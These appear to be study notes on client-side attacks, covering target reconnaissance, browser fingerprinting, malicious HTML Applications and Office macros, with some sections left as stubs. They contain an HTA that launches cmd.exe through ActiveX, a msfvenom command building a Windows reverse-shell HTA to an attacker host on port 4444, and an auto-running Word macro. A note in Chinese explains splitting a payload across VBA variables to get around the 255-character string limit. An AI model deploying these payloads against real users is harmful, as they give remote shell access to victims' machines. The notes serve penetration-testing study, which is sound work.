# Client-Side Attacks

## know target

### passive client information gathering

- site that hosts collected user agent data from various affiliate sites.
- social media
- forum websites
- photos of computer screens

### active client information gathering

1. Social Engineering and Client-Side Attacks

    pass

2. Client Fingerprinting

   [Fingerprintjs2 JavaScript library](https://github.com/Valve/fingerprintjs2)

3. Leveraging HTML Applications

   - type: .hta, .html ..
   - language: JavaScript, VBScript

hta demo
```html
<html>
   <body>
      <script>
         var c= 'cmd.exe'
         new ActiveXObject('WScript.Shell').Run(c);
      </script>
   </body>
</html>
```

msfvenom

```bash
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
```

4. Exploiting Microsoft Office

Microsoft Word Macro, VBA

filetype: .docm, .doc

```visualbasic
Sub AutoOpen()
   MyMacro
End Sub

Sub Document_Open()
   MyMacro
End Sub

Sub MyMacro()
   CreateObject("Wscript.Shell").Run "cmd"
End Sub
```

vba字符串常量长度上限为255, 但是变量中字符串长度不受次限制, 所以可以将payload分成多行拼接到变量中:

```visualbasic
dim Str as String

Str = ""
Str = Str + "AAAAA"
Str = Str + "BBBBB"
Str = Str + "CCCCC"
Str = Str + "DDDDD"
```

5. Object Linking and Embedding

DDE(Dynamic Data Exchange)
OLE(Object Linking and Embedding)

Evading Protected View by Microsoft Publisher



















